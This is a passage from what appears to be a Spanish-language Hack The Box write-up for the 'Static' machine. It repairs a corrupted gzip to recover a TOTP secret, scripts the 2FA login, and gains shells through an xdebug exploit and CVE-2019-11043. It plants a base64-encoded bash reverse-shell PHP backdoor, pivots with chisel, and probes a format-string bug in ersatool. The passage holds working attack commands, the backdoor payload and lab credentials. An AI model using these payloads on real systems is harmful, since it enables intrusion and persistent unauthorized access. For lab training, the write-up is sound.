prim\u0026#39;admin\u0026#39;im\u0026#39;d05nade22ae348aeb5660fc2140aec35850c4da997m\u0026#39;d0orxxi4c7orxwwzlo\u0026#39; IN Por tanto, el mensaje era cierto. Tenemos que pensar en cómo arreglar este archivo Gzip.\nParcheando un fichero Gzip Como el directorio se llama .ftp_uploads, a lo mejor el archivo Gzip se subió por FTP pero en modo ASCII y no en modo binario. Podemos encontrar este problema realizando una búsqueda por Internet.\nLo que pasa es que FTP en modo ASCII transformará los caracteres de salto de línea (\\n) a retorno de carro más salto de línea (\\r\\n), modificando el archivo y corrompiéndolo (en un archivo de texto, no habría cambio visual). La corrección es sencilla: solamente tenemos que encontrar \\r\\n en el archivo y reemplazarlo por \\n.\nSi mostramos el contenido del archivo Gzip corrupto en hexadecimal, vemos que hay cuatro ocurrencias de \\r\\n (en código ASCII hexadecimal, \\r es 0x0d y \\n es 0x0a):\n$ xxd db.sql.gz 00000000: 1f8b 0808 ae8b eb5e 0003 6462 2e73 716c .......^..db.sql 00000010: 0055 8ec1 6ec2 3010 44ef f98a bd25 9138 .U..n.0.D....%.8 00000020: 84c4 0920 4e86 fa80 84a8 4442 afd5 d676 ... N.....DB...v 00000030: 8bd5 d846 b6d3 40bf be69 a902 9c76 a479 ...F..@..i...v.y 00000040: 333b eb3d a30d 8327 dad0 15ad 19f8 8041 3;.=...\u0026#39;.......A 00000050: f165 74b8 d3eb 2b33 105b 069d 97ce 4302 .et...+3.[....C. 00000060: 4a80 d7d8 b6ca 04e8 8c57 1f46 0d0a 3036 J........W.F..06 00000070: 80e9 da16 b00b f655 19ee a496 264c fe52 .......U....\u0026amp;L.R 00000080: 06b5 842f 74fc 882e c9b3 74a4 2770 42ef .../t.....t.\u0026#39;pB. 00000090: 7beb c468 9307 3bd8 701a ad69 f590 744a {..h..;.p..i..tJ 000000a0: a3bb c0a7 bc40 a244 0d0a e912 a2cd ae66 .....@.D.......f 000000b0: fb06 36bb e6f9 6eef 6dc5 ede1 7f77 0d0a ..6...n.m....w.. 000000c0: 2f74 7b60 f5c0 5d6b 6314 5a99 7810 222b /t{`..]kc.Z.x.\u0026#34;+ 000000d0: 0d0a 99e7 280b 3247 f956 5655 f6ce f329 ....(.2G.VVU...) 000000e0: c950 f2a2 9c97 1927 0217 8bd9 2f6b ddf9 .P.....\u0026#39;..../k.. 000000f0: ac08 9f0d b7ef bf5b 1b0f 6ba2 e807 eaf0 .......[..k..... 00000100: 78b0 6301 0000 x.c... $ xxd db.sql.gz | grep -o 0d0a 0d0a 0d0a 0d0a 0d0a Para parchear el archivo Gzip, decidí utilizar un simple script en Ruby que descarga el archivo, toma el contenido, reemplaza las ocurrencias de \\r\\n por \\n y lo deposita en un archivo. Luego, podremos descomprimir el archivo parcheado sin errores. Esto también se puede hacer desde el propio script de Ruby con unas pocas líneas:\n#!/usr/bin/env ruby  require \u0026#39;uri\u0026#39; require \u0026#39;zlib\u0026#39;  require \u0026#39;net/http\u0026#39;  sql_file = \u0026#39;db.sql\u0026#39; gz_file = \u0026#34;#{sql_file}.gz\u0026#34; tmp = \u0026#34;tmp_#{gz_file}\u0026#34; host = \u0026#39;10.10.10.246:8080\u0026#39;  puts \u0026#34;[*] Downloading corrupted #{gz_file}file\u0026#34;  url = URI(\u0026#34;http://#{host}/.ftp_uploads/#{gz_file}\u0026#34;) res = Net::HTTP.get(url) File.binwrite(gz_file, res)  File.open(gz_file, \u0026#39;rb\u0026#39;) { |f| File.binwrite(tmp, f.read.gsub(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\n\u0026#34;)) }  Zlib::GzipReader.open(tmp) do |f|  sql = f.read.strip  puts \u0026#34;[+] Patched #{gz_file}file. Found #{sql_file}:\\n\\n#{sql}\u0026#34;   File.open(sql_file, \u0026#39;w\u0026#39;) { |ff| ff.write(sql) } end Ahora ejecutamos el script y obtenemos el fichero db.sql íntegro:\n$ ruby patch_gz.rb [*] Downloading corrupted db.sql.gz file [+] Patched db.sql.gz file. Found db.sql: CREATE DATABASE static; USE static; CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); INSERT INTO users ( id, username, password, totp ) VALUES ( null, \u0026#39;admin\u0026#39;, \u0026#39;d033e22ae348aeb5660fc2140aec35850c4da997\u0026#39;, \u0026#39;orxxi4c7orxwwzlo\u0026#39; ); Este archivo SQL crea una tabla llamada users con columnas id, username, password y totp. Y luego se añade un nuevo usuario con nombre admin. Aunque tenemos el hash de la contraseña, si lo rompemos obtendremos admin (algo que ya sabemos). El otro valor es orxxi4c7orxwwzlo para la columna totp.\nGestionando 2FA Este valor de totp corresponde a la clave utilizada para el algoritmo de TOTP (Time-based One-Time Password). El algoritmo TOTP está implementado en librerías de Python y Ruby (entre otras); y también hay apps como Google Authenticator o soluciones online.\nComo estamos utilizando Ruby esta vez, hagamos esto de TOTP también en Ruby. Primero necesitamos instalar rotp con gem install rotp. Y luego, desde irb (Ruby interactivo) podemos coger el código:\n$ irb irb(main):001:0\u0026gt; require \u0026#39;rotp\u0026#39; =\u0026gt; true irb(main):002:0\u0026gt; totp = ROTP::TOTP.new(\u0026#39;orxxi4c7orxwwzlo\u0026#39;) =\u0026gt; #\u0026lt;ROTP::TOTP:0x0000000147827380 @digest=\u0026#34;sha1\u0026#34;, @digits=6, @interval=30, @issuer=nil, @secret=\u0026#34;orxxi4c7orxwwzlo\u0026#34;\u0026gt; irb(main):003:0\u0026gt; totp.now =\u0026gt; \u0026#34;309130\u0026#34; irb(main):004:0\u0026gt; totp.now =\u0026gt; \u0026#34;860691\u0026#34; Desafortunadamente, estos códigos no funcionan. Probé con otras soluciones, pero los códigos eran los mismos, o sea que el problema no era de Ruby.\nEntonces, me di cuenta de que como es un OTP basado en tiempo, necesitaba tener la misma fecha y hora que la máquina. Uno puede saber la fecha y hora actual de la máquina desde las cabeceras de respuesta HTTP si está habilitado. Por ejemplo:\n$ curl 10.10.10.246:8080 -I HTTP/1.1 200 OK Date: Fri, 10 Dec 2021 22:22:22 GMT Server: Apache/2.4.38 (Debian) Content-Type: text/html; charset=UTF-8 Ahora podemos añadir esta fecha y hora al comando de Ruby y obtener un TOTP válido:\nirb(main):006:0\u0026gt; require \u0026#39;time\u0026#39; =\u0026gt; true irb(main):007:0\u0026gt; date = Time.parse(\u0026#39;Fri, 10 Dec 2021 22:22:22 GMT\u0026#39;).to_i =\u0026gt; 1639174942 irb(main):008:0\u0026gt; totp.at(date) =\u0026gt; \u0026#34;626733\u0026#34; Durante los intentos, probé a añadir el cálculo del TOTP y el proceso de inicio de sesión (con admin:admin) en el script de Ruby para verificar que el problema no era de tiempo entre inicio de sesión y envío del código de 2FA. Como resultado, conseguí que el proceso de inicio de sesión fuera automático; y cuando descubrí el problema, ya tenía un script funcional para iniciar sesión como admin con las siguientes líneas:\nrequire \u0026#39;rotp\u0026#39; require \u0026#39;time\u0026#39; require \u0026#39;uri\u0026#39;  require \u0026#39;net/http\u0026#39;  host = \u0026#39;10.10.10.246:8080\u0026#39; totp = \u0026#39;orxxi4c7orxwwzlo\u0026#39;  url = URI(\u0026#34;http://#{host}/vpn/login.php\u0026#34;) res = Net::HTTP.post(url, \u0026#39;username=admin\u0026amp;password=admin\u0026amp;submit=Login\u0026#39;) cookie = res[\u0026#39;Set-Cookie\u0026#39;] server_time = Time.parse(res[\u0026#39;Date\u0026#39;]).to_i puts \u0026#39;[+] Login successful\u0026#39;  code = ROTP::TOTP.new(totp).at(server_time) puts \u0026#34;[*] Generating TOTP code: #{code}\u0026#34;  res = Net::HTTP.post(url, \u0026#34;code=#{code}\u0026#34;, { Cookie: cookie }) location = res[\u0026#39;Location\u0026#39;]  puts \u0026#34;[+] 2FA successful. Go to http://#{host}/vpn/#{location}\u0026#34; puts \u0026#34;[+] Cookie: #{cookie}\u0026#34; El script retorna la URL a la que acceder (ya que el servidor aplica una redirección) y la cookie para mantener la autenticación:\n$ ruby login_2fa.rb [+] Login successful [*] Generating TOTP code: 508175 [+] 2FA successful. Go to http://10.10.10.246:8080/vpn/panel.php [+] Cookie: PHPSESSID=1l5prlovq3bek3488ehmi03koj; path=/ Podemos ver un panel como este:\nAquí podemos descargar una VPN como archivo .ovpn (como el que se utiliza para conectarse a las máquinas de Hack The Box). Podemos ver también que hay algunas máquinas que deberían ser accesibles utilizando la VPN.\nSolo por completar el script de Ruby, decidí poner todo junto. Como resultado, el script se descarga y parchea el archivo Gzip, extrae la clave de TOTP del contenido SQL, inicia sesión con credenciales y 2FA y finalmente descarga el archivo de VPN como static.ovpn. El script se llama get_vpn.rb (explicación detallada aquí).\nConexión a la VPN de Static Si ejecutamos openvpn static.ovpn, veremos algunos errores. El problema es que el archivo contiene un subdominio llamado vpn.static.htb:\n$ head static.ovpn client dev tun9 proto udp remote vpn.static.htb 1194 resolv-retry infinite nobind user nobody group nogroup persist-key persist-tun Por tanto, tenemos que añadir el subdominio a /etc/hosts. Una vez hecho, la conexión VPN funciona correctamente y nos otorga una dirección IP 172.30.0.9.\nSin embargo, no tenemos conexión con las direcciónes IP listadas en el portal. Podemos arreglarlo añadiendo rutas a mano:\n# route add -net 172.20.0.0 172.30.0.1 255.255.255.0 add net 172.20.0.0: gateway 172.30.0.1 $ ping -c 1 172.20.0.10 PING 172.20.0.10 (172.20.0.10): 56 data bytes 64 bytes from 172.20.0.10: icmp_seq=0 ttl=63 time=50.941 ms --- 172.20.0.10 ping statistics --- 1 packets transmitted, 1 packets received, 0.0% packet loss round-trip min/avg/max/stddev = 50.941/50.941/50.941/0.000 ms $ ping -c 1 172.20.0.11 PING 172.20.0.11 (172.20.0.11): 56 data bytes 64 bytes from 172.20.0.11: icmp_seq=0 ttl=63 time=51.849 ms --- 172.20.0.11 ping statistics --- 1 packets transmitted, 1 packets received, 0.0% packet loss round-trip min/avg/max/stddev = 51.849/51.849/51.849/0.000 ms Comprometiendo un servidor interno Después de un simple escaneo de nmap para la dirección IP 172.20.0.10, vemos que se trata de un servidor web:\n# nmap -sS -p- -Pn -n 172.20.0.10 Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 172.20.0.10 Host is up (0.059s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 57.40 seconds Este servidor muestra el siguiente listado de directorios:\nEl directorio vpn es el mismo de antes, por lo que no es interesante.\nEl archivo info.php muestra un phpinfo() con la configuración de PHP. Después de leer toda la información, descubrimos que xdebug está habilitado:\nEsto es un problema porque podemos conectarnos al servidor por razones de \u0026ldquo;depuración\u0026rdquo; y ganar ejecución remota de comandos (RCE). Buscando por exploits, podemos encontrar este), el cual está hecho en Python versión 2. El exploit funciona y nos otorga una línea de comandos interactiva.\nDecidí traducir el script a Python versión 3 y modificarlo para que me otorgara una reverse shell con nc, lo cual es más cómodo. El exploit resultante puede encontrarse en: xdebug_shell.py (explicación detallada aquí).\nPodemos utilizar este exploit para ganar acceso al servidor web interno (recuérdese que hay que utilizar la dirección IP que nos otorga la VPN de Static, no la de Hack The Box):\n$ python3 xdebug_shell.py http://172.20.0.10/info.php 172.30.0.9 4444 $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 172.30.0.1. Ncat: Connection from 172.30.0.1:55308. bash: cannot set terminal process group (37): Inappropriate ioctl for device bash: no job control in this shell www-data@web:/var/www/html$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@web:/var/www/html$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm www-data@web:/var/www/html$ export TERM=xterm www-data@web:/var/www/html$ export SHELL=bash www-data@web:/var/www/html$ stty rows 50 columns 158 Y aquí podemos encontrar la flag user.txt:\nwww-data@web:/var/www/html$ ls -la total 16 drwxr-xr-x 3 root root 4096 Apr 6 2020 . drwxr-xr-x 3 root root 4096 Jun 14 2021 .. -rw-r--r-- 1 root root 19 Apr 3 2020 info.php drwxr-xr-x 3 root root 4096 Jun 17 2020 vpn www-data@web:/var/www/html$ ls /home user.txt www-data www-data@web:/var/www/html$ cat /home/user.txt c3f343befcac5fa92fb5373456e94247 Además, podemos obtener una clave id_rsa para el usuario www-data:\nwww-data@web:/var/www/html$ ls -la /home/www-data total 16 drwxr-x--- 4 www-data www-data 4096 Jun 14 2021 . drwxr-xr-x 3 root root 4096 Jun 14 2021 .. lrwxrwxrwx 1 root root 9 Jun 14 2021 .bash_history -\u0026gt; /dev/null drwx------ 2 www-data www-data 4096 Jun 14 2021 .cache drwx------ 2 www-data www-data 4096 Jun 14 2021 .ssh www-data@web:/var/www/html$ ls -la /home/www-data/.ssh total 20 drwx------ 2 www-data www-data 4096 Jun 14 2021 . drwxr-x--- 4 www-data www-data 4096 Jun 14 2021 .. -rw-r--r-- 1 www-data www-data 390 Jun 14 2021 authorized_keys -rw------- 1 www-data www-data 1675 Jun 14 2021 id_rsa -rw-r--r-- 1 www-data www-data 390 Jun 14 2021 id_rsa.pub Por tanto, podemos copiarla o transferirla y conectarnos por SSH. Podemos acceder desde la dirección IP 172.20.0.10:\n$ ssh -i id_rsa www-data@172.20.0.10 www-data@web:~$ Pero también desde la dirección IP 10.10.10.246 y puerto 2222 (recuérdese que había dos servicios SSH en ejecución):\n$ ssh -i id_rsa www-data@10.10.10.246 -p 2222 www-data@web:~$ Enumeración de red Veamos qué interfaces de red tenemos:\nwww-data@web:~$ ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500  inet 172.20.0.10 netmask 255.255.255.0 broadcast 172.20.0.255  ether 02:42:ac:14:00:0a txqueuelen 0 (Ethernet)  RX packets 286733 bytes 62939217 (62.9 MB)  RX errors 0 dropped 0 overruns 0 frame 0  TX packets 284115 bytes 109282923 (109.2 MB)  TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500  inet 192.168.254.2 netmask 255.255.255.0 broadcast 192.168.254.255  ether 02:42:c0:a8:fe:02 txqueuelen 0 (Ethernet)  RX packets 16555 bytes 3910920 (3.9 MB)  RX errors 0 dropped 0 overruns 0 frame 0  TX packets 23781 bytes 10145337 (10.1 MB)  TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536  inet 127.0.0.1 netmask 255.0.0.0  loop txqueuelen 1000 (Local Loopback)  RX packets 576 bytes 38947 (38.9 KB)  RX errors 0 dropped 0 overruns 0 frame 0  TX packets 576 bytes 38947 (38.9 KB)  TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 Tenemos el siguiente esquema de red:\nPodemos conectarnos a pki, que tiene dirección IP 192.168.254.3. Para realizar un escaneo de puertos podemos utilizar nmap con proxychains configurando un reenvío de puertos dinámico con SSH:\n$ ssh -fND 9050 -i id_rsa www-data@172.20.0.10 # proxychains4 -q nmap -sS -p- -vvv -Pn -n 192.168.254.3 Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) Initiating SYN Stealth Scan Scanning 192.168.254.3 [65535 ports] SYN Stealth Scan Timing: About 0.30% done Stats: 0:01:43 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.39% done Stats: 0:02:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.50% done ^C La idea era buena, pero el escaneo se demoraba muchísimo. Además, nmap con proxychains no funciona del todo bien a veces (puede reportar falsos positivos o no reportar puertos abiertos).\nUtilizamos entonces un sencillo script en Bash y lo ejecutamos desde la máquina web para tener menor latencia:\n#!/usr/bin/env bash  for p in `seq 1 65535`; do \techo -ne \u0026#34;Trying $p\\r\u0026#34; \ttimeout 1 echo 2\u0026gt;/dev/null \u0026gt; /dev/tcp/192.168.254.3/$p \u0026amp;\u0026amp; echo \u0026#34;Port: $pOPEN\u0026#34; \u0026amp; done; wait Podemos transferir el script utilizando un servidor web con Python y wget, ya que la máquina no tiene vim ni nano.\nwww-data@web:~$ cd /tmp www-data@web:/tmp$ wget 172.30.0.9/port_scan.sh www-data@web:/tmp$ bash port_scan.sh Port: 80 OPEN En menos de 5 minutos tenemos todos los resultados. Solamente el puerto 80 (HTTP) está abierto en pki, el cual aparecerá como resultado del escaneo en pocos segundos.\nEntonces, podemos realizar un reenvío de puertos con SSH (se puede escribir ENTER + ~C para salir temporalmente de la sesión de SSH y obtener la interfaz ssh\u0026gt;):\nwww-data@web:/tmp$ ssh\u0026gt; -L 8080:192.168.254.3:80 Forwarding port. www-data@web:/tmp$ Tenemos la siguiente respuesta HTTP de pki:\n$ curl 127.0.0.1:8080 -i HTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Wed, 10 Dec 2021 22:22:22 GMT Content-Type: text/html; charset=UTF-8 Transfer-Encoding: chunked Connection: keep-alive X-Powered-By: PHP-FPM/7.1  batch mode: /usr/bin/ersatool create|print|revoke CN Esta respuesta es extraña puesto que muestra una especie de \u0026ldquo;panel de ayuda\u0026rdquo; de un binario llamado ersatool. Si aplicamos fuzzing podemos encontrar más rutas:\n$ ffuf -w $WORDLISTS/dirb/common.txt -u http://127.0.0.1:8080/FUZZ  [Status: 200, Size: 53, Words: 5, Lines: 2] index.php [Status: 200, Size: 50022, Words: 6940, Lines: 305] uploads [Status: 301, Size: 194, Words: 7, Lines: 8] Existe un directorio /uploads, pero el listado de directorios está deshabilitado.\nComprometiendo otro servidor interno Desde la respuesta HTTP anterior, se puede ver que el servidor está utilizando PHP-FPM/7.1. Existe un exploit para esta tecnología, demostrada aquí (CVE-2019-11043).\nEl exploit consiste en un proyecto en Go que expone una web-shell en la víctima. Vamos a compilar el proyecto:\n$ git clone https://github.com/neex/phuip-fpizdam $ cd phuip-fpizdam $ go build --ldflags=\u0026#39;-s -w\u0026#39; . go: downloading github.com/spf13/cobra v0.0.5 go: downloading github.com/spf13/pflag v1.0.3 $ upx phuip-fpizdam Después de leer la información básica del exploit, podemos ejecutarlo así:\n$ ./phuip-fpizdam http://127.0.0.1:8080/index.php Base status code is 200 Status code 502 for qsl=1765, adding as a candidate The target is probably vulnerable. Possible QSLs: [1755 1760 1765] Attack params found: --qsl 1755 --pisos 38 --skip-detect Trying to set \u0026#34;session.auto_start=0\u0026#34;... Detect() returned attack params: --qsl 1755 --pisos 38 --skip-detect \u0026lt;-- REMEMBER THIS Performing attack using php.ini settings... Success! Was able to execute a command by appending \u0026#34;?a=/bin/sh+-c+\u0026#39;which+which\u0026#39;\u0026amp;\u0026#34; to URLs Trying to cleanup /tmp/a... Done! Como dice en la salida del programa, ahora tenemos un parámetro en la URL en el que poner nuestros comandos de sistema:\n$ curl \u0026#34;http://127.0.0.1:8080/index.php?a=/bin/sh+-c+\u0026#39;which+which\u0026#39;\u0026amp;\u0026#34; /usr/bin/which \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Warning\u0026lt;/b\u0026gt;: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in \u0026lt;b\u0026gt;/var/www/html/index.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;2\u0026lt;/b\u0026gt;\u0026lt;br  /\u0026gt; batch mode: /usr/bin/ersatool create|print|revoke CN Cabe mencionar que el comando no siempre funciona. Es necesario enviar la petición unas tres o cuatro veces para ejecutar el comando.\nUtilizando este RCE, podemos realizar una enumeración básica del sistema:\n$ curl \u0026#34;http://127.0.0.1:8080/index.php?a=/bin/sh+-c+\u0026#39;whoami\u0026#39;\u0026amp;\u0026#34; www-data \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Warning\u0026lt;/b\u0026gt;: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in \u0026lt;b\u0026gt;/var/www/html/index.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;2\u0026lt;/b\u0026gt;\u0026lt;br  /\u0026gt; batch mode: /usr/bin/ersatool create|print|revoke CN $ curl \u0026#34;http://127.0.0.1:8080/index.php?a=/bin/sh+-c+\u0026#39;ls+-la\u0026#39;\u0026amp;\u0026#34; total 16 drwxr-xr-x 3 root root 4096 Apr 4 2020 . drwxr-xr-x 3 root root 4096 Mar 27 2020 .. -rw-r--r-- 1 root root 174 Apr 4 2020 index.php drwxr-xr-x 2 www-data www-data 4096 Mar 27 2020 uploads \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Warning\u0026lt;/b\u0026gt;: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in \u0026lt;b\u0026gt;/var/www/html/index.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;2\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; batch mode: /usr/bin/ersatool create|print|revoke CN Sin embargo, sería mucho más útil tener una consola de comandos. Para ello, se puede añadir un archivo PHP en el directorio /uploads con un comando a nivel de sistema que envíe una reverse shell.\nNótese que pki no tiene conectividad con la máquina de atacante. Por tanto, la reverse shell tiene que ser enviada a web (192.168.254.2). Y una vez en web, el tráfico será redirigido a la máquina de atacante (172.30.0.9) utilizando un reenvío de puertos con chisel.\n$ echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.254.2/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx El archivo PHP se llamará b4ckd0or.php y tendrá el siguiente contenido:\n\u0026lt;?php system(\u0026#34;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx|base64 -d|bash\u0026#34;); ?\u0026gt;La enumeración anterior nos dice que no existe nc, curl ni wget. Entonces, la mejor manera de escribir este archivo es utilizando echo y redirigiendo la salida. Hay que tener cuidado también con la codificación URL:\n$ curl \u0026#34;http://127.0.0.1:8080/index.php?a=echo+\u0026#39;\u0026lt;?php+system(\\\u0026#34;echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4yNTQuMi80NDQ0ICAwPiYx|base64+-d|bash\\\u0026#34;);+?\u0026gt;\u0026#39;+\u0026gt;+uploads/b4ckd0or.php;echo+asdf\u0026amp;\u0026#34; asdf Warning: Cannot modify header information - headers already sent by (output started at /tmp/a:1) in /var/www/html/index.php on line 2 batch mode: /usr/bin/ersatool create|print|revoke CN Nótese que añadí un comando echo asdf para saber que el comando se había ejecutado correctamente (recuérdese que hasta la tercera o cuarta petición, el comando no funciona).\nAhora necesitamos transferir chisel a la máquina web (utilizando un servidor HTTP con Python desde la máquina de atacante):\nwww-data@web:/tmp$ wget 172.30.0.9/chisel www-data@web:/tmp$ mv chisel .chisel www-data@web:/tmp$ chmod +x .chisel La máquina web será el servidor, en escucha en el puerto 1337:\nwww-data@web:/tmp$ ./.chisel server -p 1337 --reverse server: Reverse tunnelling enabled server: Fingerprint hQIxqO8XgdRQ0l9fMNAkw3PmdG9Flu7YvQeJtgZ9o2E= server: Listening on http://0.0.0.0:1337 Y la máquina de atacante se conectará al servidor (172.20.0.10:1337) y le dirá que reenvíe todo lo que llegue a 192.168.254.2:4444 (máquina web) al puerto 4444 (máquina de atacante):\n$ ./chisel client 172.20.0.10:1337 R:192.168.254.2:4444:0.0.0.0:4444 client: Connecting to ws://172.20.0.10:1337 client: Connected (Latency 82.064375ms) La salida del comando del servidor indica cómo está establecida la conexión:\nwww-data@web:/tmp$ ./.chisel server -p 1337 --reverse server: Reverse tunnelling enabled server: Fingerprint hQIxqO8XgdRQ0l9fMNAkw3PmdG9Flu7YvQeJtgZ9o2E= server: Listening on http://0.0.0.0:1337 server: session#1: tun: proxy#R:192.168.254.2:4444=\u0026gt;0.0.0.0:4444: Listening Ahora podemos hacer una petición al archivo /uploads/b4ckd0or.php y ganar una conexión por reverse shell en la máquina pki:\n$ curl http://127.0.0.1:8080/uploads/b4ckd0or.php $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 127.0.0.1. Ncat: Connection from 127.0.0.1:59809. bash: cannot set terminal process group (11): Inappropriate ioctl for device bash: no job control in this shell www-data@pki:~/html/uploads$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@pki:~/html/uploads$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm www-data@pki:~/html/uploads$ export TERM=xterm www-data@pki:~/html/uploads$ export SHELL=bash www-data@pki:~/html/uploads$ stty rows 50 columns 158 Encontrando una vulnerabilidad de Format String Estamos como usuario www-data. Esta máquina pki es un contenedor de Docker (ya que tiene un .dockerenv y solo unos pocos comandos instalados):\nwww-data@pki:~/html/uploads$ ls -a / . .dockerenv boot entry.sh home lib64 mnt php-src root sbin sys usr .. bin dev etc lib media opt proc run srv tmp var Si enumeramos capabilities de sistema, vemos que el binario ersatool tiene cap_setuid+eip:\nwww-data@pki:~/html/uploads$ getcap -r / 2\u0026gt;/dev/null /usr/bin/ersatool = cap_setuid+eip Esto significa que en algunos puntos del programa el binario tiene permiso para realizar acciones con permisos elevados (como root). Veamos si hay más archivos relacionados con el binario:\nwww-data@pki:~/html/uploads$ find / -name \\*ersatool\\* 2\u0026gt;/dev/null /usr/src/ersatool.c /usr/bin/ersatool Y tenemos el código fuente. Esto es bueno porque podemos saltarnos algunos procesos de ingeniería inversa.\nEl binario se utiliza para generar la VPN de los usuarios. Igual necesita ejecutarse como root durante algunas tareas para leer claves privadas, por ejemplo.\nDespués de mirar el código fuente, descubrimos una vulnerabilidad de Format String:\nvoid printCN(char *cn, int i) {  char fn[100];  char buffer[100];   if (i == 1) {  printf(\u0026#34;print-\u0026gt;CN=\u0026#34;);  fflush(stdout);  memset(buffer, 0, sizeof(buffer));  read(0, buffer, sizeof(buffer));  } else {  memset(buffer, 0, sizeof(buffer));  strncat(buffer, cn, sizeof(buffer));  }   if (!strncmp(\u0026#34;\\n\u0026#34;, buffer, 1)) { return; }   do {  strncpy(fn, OUTPUT_DIR, sizeof(fn));  strncat(fn, \u0026#34;/\u0026#34;, sizeof(fn) - strlen(fn));  strncat(fn, strtok(basename(buffer), \u0026#34;\\n\u0026#34;), sizeof(fn) - strlen(fn));  strncat(fn, EXT, sizeof(fn) - strlen(fn));  printf(buffer); //checking buffer content  filePrint(fn);   if (i == 1) {  printf(\u0026#34;\\nprint-\u0026gt;CN=\u0026#34;);  fflush(stdout);  memset(buffer,0,sizeof(buffer));  read(0,buffer,sizeof(buffer));  }  } while (strncmp(\u0026#34;\\n\u0026#34;, buffer, 1) \u0026amp;\u0026amp; i == 1); } ¿Puedes verlo? Esta es la línea vulnerable:\nprintf(buffer); //checking buffer content La variable buffer viene directamente de la entrada del usuario, por lo que tenemos control sobre la variable.\nLas vulnerabilidades de Format String son muy peligrosas porque podemos leer datos de la memoria e incluso escribir y modificar datos de la misma para obtener RCE.\nLa función printf utiliza format strings con caracteres especiales para imprimir los diferentes tipos de datos. Por ejemplo:\nprintf(\u0026#34;%d\\n\u0026#34;, 1337); // Prints: 1337 printf(\u0026#34;%s\\n\u0026#34;, \u0026#34;7Rocky\u0026#34;); // Prints: 7Rocky printf(\u0026#34;%x\\n\u0026#34;, 0xACDC); // Prints: acdc El formato %n escribe el número de bytes escritos hasta el formato en la dirección dada como argumento precediendo al formato.\nEl problema es que tenemos control sobre la format string, ya que podemos hacer esto:\nwww-data@pki:~/html/uploads$ ersatool batch mode: /usr/bin/ersatool create|print|revoke CN www-data@pki:~/html/uploads$ ersatool print %x ff35015f[!] ERR reading /opt/easyrsa/clients/%x.ovpn! www-data@pki:~/html/uploads$ ersatool # print print-\u0026gt;CN=%x ffe4827f[!] ERR reading /opt/easyrsa/clients/%x.ovpn! ^C Los valores ff35015f y ffe4827f son valores tomados de la pila (stack), estamos realizando una fuga de datos de memoria (memory leak).\nNótese que el programa se puede ejecutar en modo interactivo.\nPodemos hacer un poco de fuzzing con Python para ver dónde se muestra la cadena AAAA situada antes de los formatos:\nwww-data@pki:~/html/uploads$ ersatool print $(python3 -c \u0026#39;print(\u0026#34;AAAA\u0026#34; + \u0026#34;%x.\u0026#34; * 100)\u0026#39;) AAAAf7b2915f.ab89b864.f7b2915f.0.78252e78.da4b5a98.ab89be4d.41414141.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.ab89b830.74706f2f.61737279.73746e65.2e782541.78252e78.252e7825.2e78252e.78252e78.252e7825.2e78252e.78252e78.[!] ERR reading /opt/easyrsa/clients/AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.! Como se puede observar, 41414141 (AAAA en código ASCII hexadecimal) aparece en la octava posición (offset 8). Esto será importante para el proceso de explotación.\nConfiguración de red para la explotación Primero, necesitamos montar un entorno de red para tener conectividad bidireccional entre pki y la máquina de atacante.\nUn sentido ya está configurado:\npki =\u0026gt; 192.168.254.2:4444 (web) =\u0026gt; 172.30.0.9:4444 (attacker) Y el otro sentido será así:\nattacker =\u0026gt; 127.0.0.1:1234 =\u0026gt; (web) =\u0026gt; 192.168.254.3:1234 (pki) Las conexiones resultantes serán:\nPara este propósito, podemos utilizar un reenvío de puertos con SSH como antes (ENTER 